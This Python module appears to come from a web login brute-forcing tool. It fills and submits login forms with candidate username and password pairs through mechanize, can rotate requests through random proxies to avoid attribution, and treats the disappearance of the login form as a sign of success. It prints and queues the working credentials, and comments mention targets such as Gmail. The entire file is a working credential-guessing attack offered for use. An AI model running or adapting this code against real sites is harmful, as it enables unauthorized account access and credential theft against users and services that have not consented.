import mechanize
from core import utils, actions, tbrowser		

def submit(optionURL, tryCred, setProxyList, optionVerbose,\
	loginInfo, result, optionReauth):

	#	Get login form field informations
	
	# BUG parse form issue with gmail, move to tbrowser.parseLoginForm
	frmLoginID, frmFields = loginInfo
	tryPassword, tryUsername = tryCred
	
	proc = tbrowser.startBrowser()

	user_agent = tbrowser.useragent()
	
	for cred in list(result.queue):
		if tryUsername == cred[0]:
			return 0 # don't run if find password of username
	
	if setProxyList:
		#Set proxy connect
		proxyAddr = actions.randomFromList(setProxyList)
		proc.set_proxies({"http": proxyAddr})

	
	try:

		proc.open(optionURL)

		#	Select login form

		proc.select_form(nr = frmLoginID)
		
		# FILLS ALL FIELDS https://stackoverflow.com/a/5389578
		
		for field, cred in zip(frmFields, tryCred):
			proc.form[field] = cred

		#	Send request
		proc.submit()

		if optionVerbose:
			if setProxyList:
				utils.printf("[+] Trying: %s through %s" %(
					[tryUsername, tryPassword],
					proxyAddr),
				'norm')
			else:
				utils.printf("[+] Trying: %s" %(
					[tryUsername, tryPassword]),
				'norm')
		
		#	Reload - useful for redirect to dashboard
		proc.reload()
		#	If no login form -> success
		#	TODO improve condition to use captcha
		
		if tbrowser.parseLoginForm(proc.forms()) != loginInfo:
			
			proc.open(optionURL)
			# Reopen index url, if no login form -> loged in (??)
			# BUG: if url is login url (not index), this might not work
			# how about blocked messages?
			
			if tbrowser.parseLoginForm(proc.forms()) != loginInfo:
				if tryUsername:
					utils.printf("[*] Match found: %s" %(
						[tryUsername, tryPassword]),
					"good")

				else:
					utils.printf("[*] Password found: %s" %([tryPassword]), "good")

				if not optionReauth:
					result.put([tryUsername, tryPassword])
				else:
					result.put([optionURL.split("/")[2], tryUsername, tryPassword])
			
			else:
				# IF USER PROVIDES INDEX URL, THIS CONDITION IS USAULLY TRUE
				# IF USER PROVIDES LOGIN URL, THIS CONDITION WILL NOT TRUE
				utils.printf("[+] Possibly successful %s" %(
					[tryUsername, tryPassword]),
				"norm")

		else:
			if optionVerbose:
				if setProxyList:
					utils.printf("[-] Failed: %s through %s" %(
						[tryUsername, tryPassword],
						proxyAddr),
					"bad")
				else:
					utils.printf("[-] Failed: %s" %(
						[tryUsername, tryPassword]),
					"bad")

	except mechanize.HTTPError as error:
		#	Get blocked
		if optionVerbose:
			utils.printf("[x] Attacking: %s %s" %(
				error,
				[tryUsername, tryPassword])
			, "bad")
		return False

	except Exception as error:
		if optionVerbose:
			utils.printf("[x] Attacking: %s %s" %(
				error,
				[tryUsername, tryPassword]),
			"bad")
		return False
		
	finally:
		proc.close()
		return True